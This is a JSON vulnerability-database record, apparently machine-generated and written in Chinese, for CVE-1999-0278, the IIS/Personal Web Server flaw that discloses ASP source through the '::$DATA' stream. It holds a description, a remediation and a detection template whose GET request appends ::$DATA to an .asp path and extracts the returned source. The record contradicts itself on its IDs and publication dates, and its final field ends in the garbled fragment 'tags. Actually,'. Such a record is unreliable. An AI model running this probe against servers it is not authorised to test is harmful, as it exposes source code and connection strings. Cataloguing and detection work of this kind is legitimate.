[{"ave_id":"AVE-1999-0464","file_name":"1999/AVE-1999-0464.toml","cve_id":"CVE-1999-0278","title":"Microsoft IIS 及 Personal Web Server ASP 源码泄露漏洞","description":"[id]\nave_id = \"AVE-1999-00001\"\naliases = [\"CVE-1999-0278\"]\n\n[basic]\ntitle = \"Microsoft IIS 及 Personal Web Server ASP 备用数据流源码泄露漏洞\"\ndescription = \"Microsoft IIS 3.0/4.0 及 Personal Web Server 2.0/3.0/4.0 存在安全漏洞，远程攻击者通过在 URL 后附加 \\\"::$DATA\\\" 可获取 ASP 文件的源代码。该漏洞利用了 Windows NTFS 文件系统的备用数据流（ADS）特性，导致服务器将 ASP 文件以文本形式返回而非执行，从而泄露数据库连接字符串、业务逻辑等敏感信息。攻击者无需认证即可远程利用，影响范围广泛。\"\nseverity = \"MEDIUM\"\nscore = 5.0\nsources = [\"cve\", \"exploitdb\"]\npublished = \"1999-01-01\"\nupdated = \"1999-01-01\"\nremediation = \"升级到 IIS 5.0 或更高版本，或安装微软提供的安全补丁。对于无法升级的系统，建议在 IIS 中配置 URL 重写规则过滤 \\\"::$DATA\\\" 请求，或迁移 ASP 应用至更新的服务器平台。\"\n\n[references]\nurls = [\"https://nvd.nist.gov/vuln/detail/CVE-1999-0278\", \"https://www.exploit-db.com/exploits/19033\"]\n\n[exploit]\npoc_urls = [\"https://www.exploit-db.com/exploits/19033\"]\nexp_urls = []\n\n[meta]\nstatus = \"completed\"\ncollected_at = \"2026-07-16T00:00:00Z\"\n\n[info]\nid = \"POC-AVE-1999-00001\"\nname = \"CVE-1999-0278 PoC\"\nauthor = \"AVE\"\nseverity = \"medium\"\ntags = [\"cve-1999-0278\", \"iis\", \"asp\", \"information-disclosure\"]\ndescription = \"检测 Microsoft IIS 是否受 ASP 备用数据流源码泄露漏洞影响，通过附加 ::$DATA 路径后缀尝试获取 ASP 源码\"\nvuln_id = [\"CVE-1999-0278\", \"AVE-1999-00001\"]\n\n[poc]\nlogic = \"any\"\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/somefile.asp::$DATA\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"word\"\nwords = [\"<%\", \"Language=\", \"Response.\"]\nexpect = true\n\n[[poc.requests.extractors]]\ntype = \"regex\"\npart = \"body\"\nname = \"asp_source\"\nregex = [\"(<%.*?%>)\"]\ngroup = 1","severity":"MEDIUM","score":5.0,"aliases":["CVE-1999-0278"],"sources":["exploitdb"],"published":"1998-06-01T04:00:00.000","updated":"2026-06-16T21:48:03.587","remediation":"tags.\n\nActually, 